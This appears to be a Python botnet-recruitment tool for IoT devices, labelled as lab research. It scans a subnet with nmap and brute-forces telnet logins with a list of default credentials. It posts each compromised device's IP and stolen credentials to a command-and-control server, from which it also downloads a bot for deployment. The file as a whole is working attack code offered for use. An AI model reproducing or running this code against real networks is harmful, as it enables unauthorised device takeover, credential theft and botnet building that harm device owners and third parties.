#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import nmap
import sys
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"  # Default IoT lab subnet
        self.scanner = nmap.PortScanner()
        self.credentials = [
            # Default credentials
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("root", "password"),
            # IoT-specific credentials
            ("admin", ""),
            ("root", ""),
            ("admin", "1234"),
            ("root", "1234"),
            ("admin", "admin123"),
            ("root", "root123"),
            ("ipcamadmin", "admin"),
            ("temphumidadmin", "admin"),
            # Common IoT device credentials
            ("admin", "admin1234"),
            ("root", "root1234"),
            ("admin", "adminadmin"),
            ("root", "rootroot"),
            ("admin", "12345678"),
            ("root", "12345678"),
            # Empty credentials
            ("", ""),
            ("admin", None),
            ("root", None)
        ]
        self.compromised_devices = []
        self.scan_results = []
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices"""
        try:
            self.log(f"Starting network scan on {self.subnet}")
            
            # First phase: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            self.scanner.scan(hosts=self.subnet, arguments='-sn')
            active_hosts = self.scanner.all_hosts()
            
            if not active_hosts:
                self.log("No active hosts found")
                return []
            
            self.log(f"Found {len(active_hosts)} active hosts")
            
            # Second phase: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            self.scanner.scan(hosts=",".join(active_hosts), arguments=f'-p{target_ports} -sV')
            
            vulnerable_hosts = []
            for host in active_hosts:
                if host in self.scanner.all_hosts():
                    host_data = self.scanner[host]
                    if 'tcp' in host_data:
                        for port, port_data in host_data['tcp'].items():
                            if port_data['state'] == 'open':
                                service = port_data.get('name', 'unknown')
                                self.log(f"Found open port {port} ({service}) on {host}")
                                vulnerable_hosts.append({
                                    'ip': host,
                                    'port': port,
                                    'service': service
                                })
            
            self.scan_results = vulnerable_hosts
            self.log(f"Scan complete. Found {len(vulnerable_hosts)} potentially vulnerable devices")
            return vulnerable_hosts
            
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt to login via telnet"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=5)
            
            # Wait for login prompt
            response = tn.read_until(b"login: ", timeout=5)
            if b"login:" not in response:
                response = tn.read_until(b"Username: ", timeout=5)
            
            # Send username
            tn.write(username.encode() + b"\n")
            
            # Wait for password prompt
            response = tn.read_until(b"Password: ", timeout=5)
            if b"Password:" not in response:
                response = tn.read_until(b"password: ", timeout=5)
            
            # Send password
            if password:
                tn.write(password.encode() + b"\n")
            else:
                tn.write(b"\n")
            
            # Check response
            response = tn.read_until(b"$", timeout=5)
            if b"$" in response or b"#" in response or b">" in response:
                return True
            
            return False
            
        except Exception as e:
            return False
        finally:
            try:
                tn.close()
            except:
                pass
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server"""
        try:
            # Add to local list
            self.compromised_devices.append({
                'ip': ip,
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            })
            
            # Register with C&C server
            response = requests.post(
                f"{self.cnc_url}/add-scan-result",
                json={
                    'ip': ip,
                    'port': 23,  # Telnet port
                    'service': 'telnet',
                    'credentials': f"{username}:{password}"
                },
                timeout=5
            )
            
            if response.status_code == 200:
                self.log(f"Successfully registered compromised device {ip}")
                return True
            else:
                self.log(f"Failed to register device {ip} with C&C server")
                return False
                
        except Exception as e:
            self.log(f"Error registering device {ip}: {e}")
            return False
    
    def deploy_bot(self, ip, username, password):
        """Deploy bot to compromised device"""
        try:
            self.log(f"Deploying bot to {ip}")
            
            # Download bot from C&C server
            response = requests.get(f"{self.cnc_url}/download-bot", timeout=10)
            if response.status_code != 200:
                self.log("Failed to download bot from C&C server")
                return False
            
            # Save bot temporarily
            with open('temp_bot.py', 'w') as f:
                f.write(response.text)
            
            # Upload bot to device (simplified for lab environment)
            self.log(f"Bot downloaded successfully. Please manually deploy to {ip}")
            self.log(f"Use credentials: {username}:{password}")
            
            # Clean up
            os.remove('temp_bot.py')
            return True
            
        except Exception as e:
            self.log(f"Error deploying bot to {ip}: {e}")
            return False
    
    def save_results(self):
        """Save scan and exploitation results"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            with open('results/compromised_devices.json', 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log("Results saved to results/ directory")
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
    
    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            print("\n" + "="*50)
            print("IoT Security Research - Exploit Menu")
            print("="*50)
            print("1. Scan network for vulnerable devices")
            print("2. View scan results")
            print("3. Attempt exploitation")
            print("4. View compromised devices")
            print("5. Deploy bots to compromised devices")
            print("6. Save results")
            print("7. Exit")
            print("="*50)
            
            choice = input("\nEnter your choice (1-7): ")
            
            if choice == "1":
                self.scan_network()
                
            elif choice == "2":
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    print("\nScan Results:")
                    for device in self.scan_results:
                        print(f"IP: {device['ip']}, Port: {device['port']}, Service: {device['service']}")
                
            elif choice == "3":
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    target_ip = input("Enter target IP to exploit: ")
                    target = next((d for d in self.scan_results if d['ip'] == target_ip), None)
                    
                    if target:
                        print(f"\nAttempting to exploit {target_ip}...")
                        for username, password in self.credentials:
                            if self.attempt_telnet_login(target_ip, target['port'], username, password):
                                print(f"Success! Credentials: {username}:{password}")
                                self.register_compromised_device(target_ip, username, password)
                                break
                    else:
                        print("Target IP not found in scan results")
                
            elif choice == "4":
                if not self.compromised_devices:
                    print("No compromised devices available.")
                else:
                    print("\nCompromised Devices:")
                    for device in self.compromised_devices:
                        print(f"IP: {device['ip']}")
                        print(f"Credentials: {device['username']}:{device['password']}")
                        print(f"Compromised at: {device['timestamp']}")
                        print("-"*30)
                
            elif choice == "5":
                if not self.compromised_devices:
                    print("No compromised devices available.")
                else:
                    print("\nDeploying bots to compromised devices...")
                    for device in self.compromised_devices:
                        self.deploy_bot(device['ip'], device['username'], device['password'])
                
            elif choice == "6":
                self.save_results()
                
            elif choice == "7":
                print("Exiting...")
                break
                
            else:
                print("Invalid choice. Please try again.")
            
            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()
    
    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()